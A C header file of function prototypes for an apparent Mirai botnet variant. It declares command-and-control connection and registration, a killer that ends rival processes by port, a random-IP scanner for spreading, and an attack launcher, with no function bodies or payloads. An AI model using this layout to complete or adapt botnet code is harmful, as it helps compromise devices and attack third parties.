// Function Declarations - Prevent Conflicts
#ifndef FUNCTION_DECLARATIONS_H
#define FUNCTION_DECLARATIONS_H

#include <stdint.h>

#ifdef __cplusplus
extern "C"
{
#endif

// Forward declarations for types
#ifndef ATTACK_VECTOR
  typedef uint8_t ATTACK_VECTOR;
#endif

#ifndef BOOL
  typedef int BOOL;
#endif

#ifndef port_t
  typedef uint16_t port_t;
#endif

  struct attack_target;
  struct attack_option;

  // Main functions
  int mirai_main(void);
  void mirai_init(void);
  void mirai_cleanup(void);

  // Network functions
  void connect_to_cnc(void);
  void handle_control_message(void);
  void handle_server_message(void);
  void send_registration(void);
  void process_command(char *cmd);

  // Killer functions
  void killer_init(void);
  BOOL killer_kill_by_port(port_t);
  void enum_windows_processes(void);

  // Scanner functions
  void scanner_init(void);
  void scanner_scan_random(void);
  void scanner_scan_target(uint32_t ip);

  // Attack functions
  int attack_init(void);
  void attack_kill_all(void);
  void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);

#ifdef __cplusplus
}
#endif

#endif // FUNCTION_DECLARATIONS_H
